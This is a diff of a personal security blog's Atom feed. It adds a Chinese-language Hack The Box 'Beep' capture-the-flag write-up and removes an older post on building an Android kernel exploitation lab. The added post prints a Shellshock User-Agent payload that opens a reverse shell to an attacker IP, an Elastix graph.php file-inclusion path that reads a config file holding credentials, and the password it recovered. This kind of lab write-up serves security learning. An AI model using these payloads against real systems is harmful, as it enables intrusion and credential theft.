@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://foyjog.github.io/"/>
-  <updated>2019-05-17T05:24:28.046Z</updated>
+  <updated>2019-05-17T08:26:35.517Z</updated>
   <id>https://foyjog.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hack The Box Beep</title>
+    <link href="https://foyjog.github.io/2019/05/17/Hack-The-Box-Beep/"/>
+    <id>https://foyjog.github.io/2019/05/17/Hack-The-Box-Beep/</id>
+    <published>2019-05-17T07:48:33.000Z</published>
+    <updated>2019-05-17T08:26:35.517Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>nmap来一波<br><img src="/img/BeepNmap.png" alt="我是图片">。<br>感觉上又很多点。</p><h3 id="bash漏洞"><a href="#bash漏洞" class="headerlink" title="bash漏洞"></a>bash漏洞</h3><p>打开10.10.10.7:10000，发现是个登陆窗口。<br><img src="/img/BeepLogin.png" alt="我是图片">。</p><p>利用burpsuite抓包，发现这个url是个cgi。所以试一试bash漏洞。<br><img src="/img/wget.png" alt="我是图片">。<br>利用python的SimpleHTTPServer模块。<br><img src="/img/wget2.png" alt="我是图片">。<br>发现我们的命令被执行了。执行如下步骤：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8081</span><br><span class="line"><span class="comment"># 设置User-Agent的值如下</span></span><br><span class="line">() &#123; :;&#125;; bash -i &gt;&amp; /dev/tcp/10.10.14.25/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>得到shell，竟然是个root权限= =。<br><img src="/img/success2.png" alt="我是图片">。<br><img src="/img/success3.png" alt="我是图片">。</p><h3 id="elastic漏洞"><a href="#elastic漏洞" class="headerlink" title="elastic漏洞"></a>elastic漏洞</h3><p>打开10.10.10.7，发现是个elastix的软件。利用searchsploit进行漏洞查找。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit elastix</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                           |  Path</span><br><span class="line">                                                                                                                                                                         | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Elastix - &apos;page&apos; Cross-Site Scripting                                                                                                                                    | exploits/php/webapps/38078.py</span><br><span class="line">Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                  | exploits/php/webapps/38544.txt</span><br><span class="line">Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                            | exploits/php/webapps/34942.txt</span><br><span class="line">Elastix 2.2.0 - &apos;graph.php&apos; Local File Inclusion                                                                                                                         | exploits/php/webapps/37637.pl</span><br><span class="line">Elastix 2.x - Blind SQL Injection                                                                                                                                        | exploits/php/webapps/36305.txt</span><br><span class="line">Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                       | exploits/php/webapps/38091.php</span><br><span class="line">FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                   | exploits/php/webapps/18650.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure></p><p>这里的’graph.php’ Local File Inclusion 是可以用的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span><br></pre></td></tr></table></figure></p><p>发现里面有个密码为jEhdIekWmdjE。试试ssh。</p><p><img src="/img/BeepRoot.png" alt="我是图片">。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;扫描&quot;&gt;&lt;a href=&quot;#扫描&quot; class=&quot;headerlink&quot; title=&quot;扫描&quot;&gt;&lt;/a&gt;扫描&lt;/h3&gt;&lt;p&gt;nmap来一波&lt;br&gt;&lt;img src=&quot;/img/BeepNmap.png&quot; alt=&quot;我是图片&quot;&gt;。&lt;br&gt;感觉上又很多点。&lt;/p&gt;
+&lt;
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Hack The Box Popcorn</title>
@@ -411,27 +433,6 @@
       
       
         &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;昨天搭建好了环境,那么开始最简单的一个exploit.即:Stack Buffer overflow.&lt;br&gt;我这里下载的是r10版本的nd
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Linux Kernel Exploitation on Android环境搭建(mac os)</title>
-    <link href="https://foyjog.github.io/2018/06/26/Linux-Kernel-Exploitation-on-Android%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-mac-os/"/>
-    <id>https://foyjog.github.io/2018/06/26/Linux-Kernel-Exploitation-on-Android环境搭建-mac-os/</id>
-    <published>2018-06-26T08:01:24.000Z</published>
-    <updated>2018-07-03T08:18:24.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在公司要开始做安卓的内核漏洞挖掘,在网上找到一个android的漏洞挖掘环境靶场,废话不多,先搭环境先.<br>项目的地址:<a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground" target="_blank" rel="noopener">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</a></p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>阅读readme,发现基本上手把手教学,按照流程走一波基本上ok.但是这里有个问题的是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android create avd --force -t <span class="string">"Google Inc.:Google APIs:19"</span> -n kernel_challenges</span><br></pre></td></tr></table></figure></p><p>无法成功,自己捣鼓了一下,以下流程可以获得成功.</p><p>打开android studio,利用avd manager创建一个api为19的nexes 5x.<br><img src="/img/1.png" alt="我是图片"><br>打开sdk-manager,安装如下的东西:<br><img src="/img/2.png" alt="我是图片"><br>保证emulator等版本对上,保证将其加入环境变量等操作.(我下了一个比较早的sdk版本,替换了最新的emulator)<br><img src="/img/3.png" alt="我是图片"></p><p>还有如下的操作:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp elfutils/<span class="number">0.153</span>/libelf/elf.h /usr/local/include</span><br></pre></td></tr></table></figure></p><p>将0.153删除,之后编译的时候还会提示缺少很多头文件,我们去ubuntu的目录下去寻找即可.<br>然后按照教程执行:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -show-kernel -kernel arch/arm/boot/zImage -avd Nexus_5X_API_19 -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</span><br></pre></td></tr></table></figure></p><p><img src="/img/4.png" alt="我是图片"><br>可以看到环境已经启动.terminal中输入adb shell,输入ls /proc, 发现stack_buffer_overflow的存在<br><img src="/img/5.png" alt="我是图片"><br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; &gt; /proc/stack_buffer_overflow</span><br></pre></td></tr></table></figure></p><p>发现系统内核崩溃.<br><img src="/img/6.png" alt="我是图片"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://stackoverflow.com/questions/7412548/error-gnu-stubs-32-h-no-such-file-or-directory-while-compiling-nachos-source" target="_blank" rel="noopener">https://stackoverflow.com/questions/7412548/error-gnu-stubs-32-h-no-such-file-or-directory-while-compiling-nachos-source</a><br><a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground/blob/master/Readme.md" target="_blank" rel="noopener">https://github.com/Fuzion24/AndroidKernelExploitationPlayground/blob/master/Readme.md</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在公司要开始做安卓的内核漏洞挖掘,在网上找到一个android的漏洞挖掘环境靶场,废话不多,先搭环境先.&lt;br&gt;项目的地址:&lt;a href=
       
     
     </summary>
